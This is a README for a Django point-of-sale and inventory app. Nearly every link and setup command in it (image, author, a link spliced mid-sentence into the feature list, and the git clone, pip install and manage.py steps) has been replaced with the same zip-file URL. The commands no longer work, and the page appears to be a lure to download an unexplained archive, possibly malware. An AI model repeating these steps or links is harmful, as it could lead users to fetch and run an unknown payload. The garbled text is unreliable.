## Point of Sale (POS) 

A Point of Sale web app for businesses built with Python and Django.

## DFD

![1](https://raw.githubusercontent.com/zubairmk83/pos-ims/main/Constance/pos-ims.zip)

## Features
- User Management:
The system supports multiple user roles, such as admin/manager, cashier. Each user has unique login credentials. Admin has the authority to add, delete, or modify user accounts and their permissions. Define permissions for each user role (e.g., access to specific functionalities, data visibility)

- Product Management:
Ability to add new products with details such as name, description, category, price, and stock. Support for updating product information like price changes or quantity adjustments. Ability to categorize products for easier management and organization.

- Purchase:
Create purchase orders for new inventory from vendors. Track purchase history and manage vendor https://raw.githubusercontent.com/zubairmk83/pos-ims/main/Constance/pos-ims.zip purchased inventory and update stock levels accordingly.

- Stock Management:
Track inventory levels in real-time for all products and variations. Generate low-stock alerts to trigger reordering when a stock falls below a threshold.

- Sales:
Ability to process sales transactions quickly and efficiently. Generation of receipts for customers.

- Return:
Capability to handle returns and exchanges. Integration with sales records to process returns and update inventory accordingly.



## Tech Stack

- Frontend: HTML, CSS, JavaScript, Boostrap
- Backend: Django, Python, Ajax, SQLite 

## Installation

  1. Clone or download the repository:

  ` git clone https://raw.githubusercontent.com/zubairmk83/pos-ims/main/Constance/pos-ims.zip`

  2. Create a virtual environment :

  PowerShell:
  ```
   python -m venv venv
   venv\Scripts\activate
  ```
  
  Linux:
  ```
  python3 -m venv venv
  source venv/bin/activate
  ```

  3. Install dependencies:  
  ` pip install -r https://raw.githubusercontent.com/zubairmk83/pos-ims/main/Constance/pos-ims.zip`
  

## Run it locally

1. Make database migrations:  
  `python https://raw.githubusercontent.com/zubairmk83/pos-ims/main/Constance/pos-ims.zip makemigrations` and 
  `python https://raw.githubusercontent.com/zubairmk83/pos-ims/main/Constance/pos-ims.zip migrate`

2. Create superuser `python https://raw.githubusercontent.com/zubairmk83/pos-ims/main/Constance/pos-ims.zip createsuperuser`

3. Run the server: `python https://raw.githubusercontent.com/zubairmk83/pos-ims/main/Constance/pos-ims.zip runserver`

4. Open a browser and go to: `http://127.0.0.1:8000/`

5. Log In with your superuser credentials.
    

## Authors

- [@Zayed-Rahat](https://raw.githubusercontent.com/zubairmk83/pos-ims/main/Constance/pos-ims.zip)


